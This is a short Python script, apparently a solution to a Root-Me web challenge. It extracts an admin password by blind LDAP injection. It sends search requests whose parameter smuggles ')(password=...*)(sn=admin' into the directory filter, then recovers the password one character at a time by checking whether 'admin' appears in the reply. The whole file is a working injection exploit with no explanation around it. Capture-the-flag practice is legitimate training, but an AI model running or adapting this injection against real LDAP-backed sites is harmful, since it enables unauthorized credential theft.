import requests
import re
import time

url = 'http://challenge01.root-me.org/web-serveur/ch26/?action=dir&search='

charset = 'abcdefghijklmnopqrstuvwxyz1234567890'
password = ''

for r in xrange(20):

    for i in charset:
        req = requests.get(url + str(')(password=') + str(password) +str(i)+ str('*)(sn=admin'))
        if re.search('admin', req.text) is not None:
            password+=i
            print password
            break
        time.sleep(0.5)
print password
